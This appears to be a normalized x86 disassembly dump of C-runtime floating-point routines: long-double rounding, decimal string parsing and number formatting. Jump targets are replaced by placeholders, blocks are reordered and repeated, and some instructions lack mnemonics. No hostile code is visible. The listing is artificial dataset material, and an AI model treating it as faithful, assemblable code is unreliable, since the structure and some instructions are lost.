lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_41e8d9
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
cmp ebx 0xffffc001
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
cmp esi edx
mov [ ebp + 0x8 ] esi
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_41ee1b
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
xor esi esi
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0xc ]
inc esi
xor ecx ecx
cmp [ ebp + 0x24 ] ebx
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x6c ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_412089
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_41202a
add esp 0x14
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_413965
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_41f4af ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
mov [ ebp - 0x58 ] esi
jbe r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
cmp al 0x9
mov [ ebp - 0x5c ] esi
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_4204f4
mov eax [ ebp - 0x64 ]
xor ecx ecx
add esp 0xc
cmp [ ebp - 0x68 ] ecx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] ecx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp al 0x63
jle r-xdata
cmp [ ebp - 0x5c ] ecx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp al 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x7c ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
mov [ ebp - 0x6c ] 0x1
mov esi rw-data
sub esi 0x60
cmp eax ecx
mov [ ebp - 0x54 ] eax
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] ecx
jne r-xdata
neg eax
mov esi rw-data
mov [ ebp - 0x54 ] eax
sub esi 0x60
cmp [ ebp - 0x54 ] ecx
je r-xdata
mov [ ebp - 0x3c ] cx
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add esi 0x54
and eax 0x7
test eax eax
mov [ ebp - 0x4c ] esi
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
add eax esi
mov ebx eax
cmp [ ebx ] 0x8000
mov [ ebp - 0x70 ] ebx
jb r-xdata
movzx edx [ ebx + 0xa ]
mov ecx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax edx
mov edi 0x7fff
xor eax ecx
and ecx edi
and edx edi
and eax 0x8000
cmp cx 0x7fff
lea edi [ edx + ecx ]
movzx edi di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
mov esi [ ebp - 0x4c ]
lea ebx [ ebp - 0x48 ]
mov [ ebp - 0x70 ] ebx
neg ax
sbb eax eax
and [ ebp - 0x38 ] 0x0
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp dx 0x7fff
jae r-xdata
cmp di 0xbffd
ja r-xdata
cmp di 0x3fbf
ja r-xdata
test cx cx
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
xor ecx ecx
cmp dx cx
jne r-xdata
inc edi
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
and [ ebp - 0x68 ] ecx
lea esi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc edi
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
inc esi
inc esi
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x3c ]
add ebx 0x8
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ebx
cmp [ ebx + 0x4 ] ecx
jne r-xdata
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add ecx ecx
test edx edx
mov [ ebp - 0x64 ] edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x78 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebx ] ecx
jne r-xdata
and [ ebp - 0x32 ] cx
jmp r-xdata
add edi 0xffff
test di di
jge r-xdata
test [ ebp - 0x24 ] 0x80000000
jne r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x78 ] 0x0
mov [ esi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x3c ] ecx
jmp r-xdata
cmp [ ebp - 0x2c ] 0x8000
ja r-xdata
mov ecx edi
neg ecx
movzx esi cx
add edi esi
test di di
jg r-xdata
mov esi [ ebp - 0x28 ]
mov ecx [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr ecx 0x1f
mov edx esi
add esi esi
or esi ecx
mov ecx [ ebp - 0x24 ]
shr edx 0x1f
add ecx ecx
or ecx edx
add edi 0xffff
test di di
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] ecx
jg r-xdata
mov ecx [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx ecx [ ecx ]
and [ ebp - 0x78 ] 0x0
imul ecx edx
mov edx [ esi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
mov ebx [ ebp - 0x70 ]
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x24 ]
mov ebx [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl ecx 0x1f
shr ebx 0x1
or ebx ecx
mov ecx [ ebp - 0x2c ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec esi
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x2c ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
cmp di 0x7fff
mov esi [ ebp - 0x4c ]
jae r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov cx [ ebp - 0x2a ]
mov [ ebp - 0x3c ] cx
mov ecx [ ebp - 0x28 ]
mov [ ebp - 0x3a ] ecx
mov ecx [ ebp - 0x24 ]
or edi eax
mov [ ebp - 0x36 ] ecx
mov [ ebp - 0x32 ] di
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
cmp [ ebp - 0x22 ] 0xffff
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] 0x8000
inc edi
jmp r-xdata
sub_41f4df
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx edx
mov eax 0x8000
and ecx eax
and edx 0x7fff
test cx cx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x30 ] 0xcc
mov [ ebp - 0x2f ] 0xcc
mov [ ebp - 0x2e ] 0xcc
mov [ ebp - 0x2d ] 0xcc
mov [ ebp - 0x2c ] 0xcc
mov [ ebp - 0x2b ] 0xcc
mov [ ebp - 0x2a ] 0xcc
mov [ ebp - 0x29 ] 0xcc
mov [ ebp - 0x28 ] 0xcc
mov [ ebp - 0x27 ] 0xcc
mov [ ebp - 0x26 ] 0xfb
mov [ ebp - 0x25 ] 0x3f
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x6c ] ecx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx 0x7fff
jne r-xdata
test esi esi
jne r-xdata
test dx dx
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
shr ebx 0x8
mov eax esi
shr eax 0x18
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx ecx ax
movsx ebx cx
mov [ ebp - 0x4c ] ecx
xor eax eax
mov ecx rw-data
neg ebx
sub ecx 0x60
cmp ebx eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x20 ] ax
mov [ ebp - 0x68 ] ecx
je r-xdata
mov eax 0x80000000
cmp esi eax
mov [ ebx ] 0x1
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
cmp cx 0x3fff
mov ebx 0x7fff
jb r-xdata
jge r-xdata
test esi 0x40000000
jne r-xdata
test edi edi
je r-xdata
and [ ebx ] di
cmp cx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x60 ]
mov ecx [ ebp - 0x4c ]
mov [ edx ] cx
je r-xdata
mov esi [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
movzx edx cx
mov ecx esi
